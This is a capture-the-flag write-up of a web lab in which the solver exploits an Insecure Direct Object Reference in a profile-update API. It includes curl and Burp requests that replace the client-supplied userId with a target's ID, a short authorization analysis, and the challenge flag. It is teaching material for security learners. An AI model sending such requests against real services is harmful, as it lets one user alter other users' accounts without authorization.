# Defhawk Sponsored Challenge 2

| Field      | Value |
|------------|-------|
| Category   | Sponsors |
| Points     | 150 |
| Solves     | 36 |
| Connection | https://defhawk.com/battleground/hack-arena/categories-list/Web/mern-stack-jwt/ecom-bac-idor |

## Description

This lab explores the critical vulnerability known as Insecure Direct Object Reference (IDOR) within a web application's profile management system. You will learn how to identify instances where an application trusts client-side identifiers (like a userId) to perform sensitive updates, and how to exploit this trust to modify data belonging to other users.

Flag Format: DEFHAWK{}

```
*Note: Register on the defhawk platform to play the challenge and submit the found flag here*
```

## Writeup

> ```Flag:```  `DEFHAWK{Sp00fing_An0ther_Us3r_IDOR}`

## Challenge Information
- **CTF Name:** HackZero 2026
- **Challenge Name:** Defhawk 2
- **Category:** Sponsership Challs: Web Catg.
- **Points:** 150
- **Author:** @Defhawk
- **Solved By:** ret2.libc



## IDOR in Profile Update API

I solved this web challenge by testing an IDOR bug — Insecure Direct Object Reference. Big respect to the challenge authors; this lab teaches a real and common API mistake in a very practical way.

## Challenge Goal

The goal was to check whether the profile update API trusted `userId` from the client side. If it did, I could change another user’s profile by replacing my own `userId` with the target `userId`.

**Target ID given in lab:**

- `68baf161f53a60d57a7b0277`


## Step 1: Register and Login

I created my own user first.

API base used by frontend:

- `https://web.labs.defhawk.com:8000/api`

Signup:

```bash
TS=$(date +%s)
EMAIL="idor${TS}@proton.me"
PASS='P@ssw0rd123!'
NAME="idor-${TS}"

curl -s 'https://web.labs.defhawk.com:8000/api/auth/signup' \
  -H 'Content-Type: application/json' \
  --data "{\"fullName\":\"$NAME\",\"email\":\"$EMAIL\",\"password\":\"$PASS\",\"exist\":false,\"method\":\"local\"}" | jq
```

Login:

```bash
LOGIN_JSON=$(curl -s 'https://web.labs.defhawk.com:8000/api/auth/login' \
  -H 'Content-Type: application/json' \
  --data "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}")

echo "$LOGIN_JSON" | jq
TOKEN=$(echo "$LOGIN_JSON" | jq -r '.data.token')
MYID=$(echo "$LOGIN_JSON" | jq -r '.data.user._id')
echo "TOKEN=$TOKEN"
echo "MYID=$MYID"
```

## Step 2: Capture Legit Request in Burp

In Burp browser, I went to:

- Account -> Account Settings -> Profile

Then I changed the full name and submitted once.

In Burp HTTP history, I got:

- `POST /api/user/update-profile`

Body looked like:

```json
{
  "userId": "<my_user_id>",
  "fullName": "some name"
}
```

This is the red flag: the client controls `userId`.

## Step 3: Test IDOR in Repeater

I sent the same request to Repeater, changing only `userId` to the target:

- `68baf161f53a60d57a7b0277`

I kept the same auth session/token.

Request body:

```json
{
  "userId": "68baf161f53a60d57a7b0277",
  "fullName": "IDOR_TEST_1"
}
```

The response returned `200 OK` and target profile data. That confirmed IDOR.

## Step 4: Terminal PoC (Clean and Reproducible)

I also verified directly from terminal.

Update my own profile first:

```bash
curl -s 'https://web.labs.defhawk.com:8000/api/user/update-profile' \
  -H 'Content-Type: application/json' \
  -H "authorization: $TOKEN" \
  --data "{\"userId\":\"$MYID\",\"fullName\":\"ME_TEST\"}" | jq
```

Now exploit target:

```bash
TARGET_ID='68baf161f53a60d57a7b0277'
curl -s 'https://web.labs.defhawk.com:8000/api/user/update-profile' \
  -H 'Content-Type: application/json' \
  -H "authorization: $TOKEN" \
  --data "{\"userId\":\"$TARGET_ID\",\"fullName\":\"IDOR_PWNED\"}" | jq
```

I got `200` with target user data and the flag in response:

- `DEFHAWK{Sp00fing_An0ther_Us3r_IDOR}`

## Analysis

The backend trusted `userId` from the request body. It did not enforce the rule: “logged-in user can update only own profile.”

So authentication existed, but authorization checks were weak. This is the reason.

## Author

ret2.libc
